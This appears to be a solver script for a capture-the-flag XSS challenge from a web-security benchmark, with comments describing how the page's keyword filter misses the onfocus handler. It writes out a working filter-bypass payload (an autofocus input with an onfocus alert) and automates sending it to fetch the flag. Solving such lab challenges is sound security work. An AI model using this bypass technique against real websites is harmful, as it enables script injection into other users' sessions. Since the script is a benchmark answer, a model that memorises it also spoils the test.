#!/usr/bin/env bash
# XBEN-004-24 — "Dalgona Challenges", star (tags: xss)
#
# The reflection lands after a `>` that closes the input, so a tag of your own
# follows it. The filter drops `script`, `svg`, a single quote and the four
# handlers somebody thought of: `onload`, `onmouseover`, `onclick`, `onbegin`,
# `onerror`. `onfocus` is not one of them, and the checker goes out of its way to
# dispatch a focus event at every `[autofocus]` element, so the one handler left
# open is also the one it fires for you.
#
# The server renders the page, loads its own rendering in PhantomJS and prints
# the flag when a dialog fires with the message "XSS".
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/xss25" --session "$SESSION" --new --capture >/dev/null
seq="$("$H5I" websec replay req_0 --create --set method=POST \
    --set 'form.solution=<input autofocus onfocus=alert("XSS")>' \
    --session "$SESSION" | python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec show "res_$seq" --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
